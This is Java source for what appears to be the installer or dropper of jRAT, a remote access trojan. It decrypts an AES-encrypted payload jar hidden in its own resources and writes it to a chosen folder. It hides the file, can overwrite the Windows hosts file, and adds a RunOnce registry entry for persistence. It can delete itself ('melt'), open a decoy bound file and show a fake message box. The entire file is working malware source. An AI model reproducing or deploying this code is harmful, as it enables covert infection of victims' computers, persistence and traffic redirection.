package su.jrat.installer;

import java.awt.Desktop;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.Reader;
import java.security.Key;

import javax.crypto.Cipher;
import javax.crypto.CipherInputStream;
import javax.crypto.spec.SecretKeySpec;
import javax.swing.JOptionPane;
import javax.swing.UIManager;

public class Main {

	public static final byte[] buffer = new byte[1024];
	public static final String userHome = System.getProperty("user.home");

	public static final String STUB_RESOURCE = "/e";
	public static final String KEY_RESOURCE = "/k";

	@SuppressWarnings("resource")
	public static void main(String[] args) {
		try {
			if (OperatingSystem.getOperatingSystem() == OperatingSystem.OSX) {
				System.setProperty("apple.awt.UIElement", "true");
			}

			InputStream stubInput = Main.class.getResourceAsStream(STUB_RESOURCE);
			InputStream keyInput = Main.class.getResourceAsStream(KEY_RESOURCE);

			byte[] encryptionKey = new byte[16];

			for (int i = 0; i < encryptionKey.length; i++) {
				encryptionKey[i] = (byte) keyInput.read();
			}

			String rawKeyFile = readString(keyInput);

			String[] keyArgs = rawKeyFile.split(",");
			String dropLocation = decode(keyArgs[0].trim());
			String dropFileName = decode(keyArgs[1].trim());

			boolean hidden = Boolean.parseBoolean(decode(keyArgs[9].trim()));

			if (decode(keyArgs[7]).equalsIgnoreCase("true")) {
				Thread.sleep(Long.parseLong(decode(keyArgs[8])));
			}
			
			boolean runNextBoot = Boolean.parseBoolean(keyArgs[10]);

			if (System.getProperty("os.name").toLowerCase().contains("win") && Main.class.getResourceAsStream("/host.dat") != null) {
				try {
					File file = new File(System.getenv("SystemDrive") + "\\Windows\\System32\\drivers\\etc\\hosts");

					BufferedReader reader = new BufferedReader(new InputStreamReader(Main.class.getResourceAsStream("/host.dat")));

					boolean overwrite = Boolean.parseBoolean(decode(reader.readLine()));

					FileWriter writer = new FileWriter(file, overwrite);
					BufferedWriter out = new BufferedWriter(writer);

					String host = "";
					String line;
					while ((line = reader.readLine()) != null) {
						host += line + "\n";
					}

					out.write(decode(host));

					out.close();
					reader.close();
				} catch (Exception ex) {
					ex.printStackTrace();
				}
			}

			if (hidden && OperatingSystem.getOperatingSystem() != OperatingSystem.WINDOWS) {
				dropFileName = "." + dropFileName;
			}

			File file = null;
			if (dropLocation.equals("root/C drive")) {
				if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
					file = new File("C:\\" + dropFileName + ".jar");
				} else {
					file = new File("/" + dropFileName + ".jar");
				}
			} else if (dropLocation.equals("temp/documents (unix)")) {
				if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
					file = File.createTempFile(dropFileName, ".jar");
				} else {
					file = new File(userHome + "/Documents/" + dropFileName + ".jar");
				}
			} else if (dropLocation.equals("appdata")) {
				if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
					file = new File(System.getenv("APPDATA") + "\\" + dropFileName + ".jar");
				} else if (OperatingSystem.getOperatingSystem() == OperatingSystem.OSX) {
					file = new File(userHome + "/Library/" + dropFileName + ".jar");
				} else {
					file = File.createTempFile(dropFileName, ".jar");
				}
			} else if (dropLocation.equals("desktop")) {
				file = new File(userHome + "/Desktop/" + dropFileName + ".jar");
			}

			if (file.getParentFile() != null && !file.getParentFile().exists()) {
				file.getParentFile().mkdirs();
			}

			FileOutputStream out = new FileOutputStream(file);
			Cipher dcipher = Cipher.getInstance("AES");

			Key keySpec = new SecretKeySpec(encryptionKey, "AES");
			dcipher.init(Cipher.DECRYPT_MODE, keySpec);
			stubInput = new CipherInputStream(stubInput, dcipher);
			int numRead = 0;
			while ((numRead = stubInput.read(buffer)) >= 0) {
				out.write(buffer, 0, numRead);
			}
			out.close();

			if (hidden && OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
				Runtime.getRuntime().exec(new String[] { "attrib", "+h", file.getAbsolutePath() });
			}

			String javapath = System.getProperty("java.home") + "\\bin\\java";

			if (Main.class.getResourceAsStream("/bind.dat") != null) {
				String[] binds = readString(Main.class.getResourceAsStream("/bind.dat")).split(",");

				String dropp = decode(binds[0].trim());
				String name1 = decode(binds[1].trim());
				String ext = decode(binds[2].trim());

				File dropfile = null;

				if (dropp.equals("temp/documents (unix)")) {
					if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
						dropfile = File.createTempFile(name1, ext);
					} else {
						dropfile = new File(userHome + "/Documents/");
					}
				} else if (dropp.equals("appdata")) {
					if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
						dropfile = new File(System.getenv("APPDATA") + "\\" + name1 + ext);
					} else if (OperatingSystem.getOperatingSystem() == OperatingSystem.OSX) {
						dropfile = new File(userHome + "/Library/" + name1 + ext);
					} else {
						dropfile = File.createTempFile(name1, ext);
					}
				} else if (dropp.equals("desktop")) {
					dropfile = new File(userHome + "/Desktop/" + name1 + ext);
				} else {
					dropfile = new File(userHome + "/Desktop/" + name1 + ext);
				}

				FileOutputStream fos = new FileOutputStream(dropfile);
				InputStream rin = Main.class.getResourceAsStream("/" + name1 + ext);

				int read;

				while ((read = rin.read(buffer)) != -1) {
					fos.write(buffer, 0, read);
				}

				rin.close();
				fos.close();

				try {
					Desktop.getDesktop().open(dropfile);
				} catch (Exception ex) {
					ex.printStackTrace();
				}

			}

			if (System.getProperty("os.name").toLowerCase().contains("win")) {
				boolean melt = Boolean.parseBoolean(decode(keyArgs[2].trim()));
				
				String mepath = Main.class.getProtectionDomain().getCodeSource().getLocation().getPath();

				if (runNextBoot) {
					WinRegistry.writeStringValue(WinRegistry.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", "Java", "\"" + javapath + "\" -jar \"" + file.getAbsolutePath() + "\"" + (melt ? " -melt" : ""));
				} else {
					if (melt) {
						Runtime.getRuntime().exec(new String[] { javapath, "-jar", file.getAbsolutePath(), "-melt", mepath });
					} else {
						Runtime.getRuntime().exec(new String[] { javapath, "-jar", file.getAbsolutePath() });
					}
				}
			} else {
				if (Boolean.parseBoolean(decode(keyArgs[2].trim()))) {
					String mepath = Main.class.getProtectionDomain().getCodeSource().getLocation().getPath();
					Runtime.getRuntime().exec(new String[] { "java", "-jar", file.getAbsolutePath(), "-melt", mepath });
				} else {
					Runtime.getRuntime().exec(new String[] { "java", "-jar", file.getAbsolutePath().replace("file:", "").replace(" ", "%20") });
				}
			}
			if (decode(keyArgs[3]).equalsIgnoreCase("true")) {
				try {
					UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
				} catch (Exception e1) {
					e1.printStackTrace();
				}
				JOptionPane.showMessageDialog(null, decode(keyArgs[4]), decode(keyArgs[5]), Integer.parseInt(decode(keyArgs[6])));
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	public static String readString(InputStream is) throws IOException {
		char[] buf = new char[2048];
		Reader r = new InputStreamReader(is, "UTF-8");
		StringBuilder s = new StringBuilder();
		while (true) {
			int n = r.read(buf);
			if (n < 0)
				break;
			s.append(buf, 0, n);
		}
		return s.toString();
	}

	public static String decode(String s) throws Exception {
		s = Base64.decode(s);
		char[] data = s.toCharArray();
		int len = data.length;

		if ((len & 0x1) != 0) {
			throw new NumberFormatException();
		}

		byte[] out = new byte[len >> 1];

		int i = 0;
		for (int j = 0; j < len; i++) {
			int f = toDigit(data[j], j) << 4;
			j++;
			f |= toDigit(data[j], j);
			j++;
			out[i] = ((byte) (f & 0xFF));
		}

		return new String(out);
	}

	private static int toDigit(char ch, int index) throws Exception {
		int digit = Character.digit(ch, 16);
		if (digit == -1) {
			throw new Exception("Illegal hexadecimal character " + ch + " at index " + index);
		}
		return digit;
	}

}
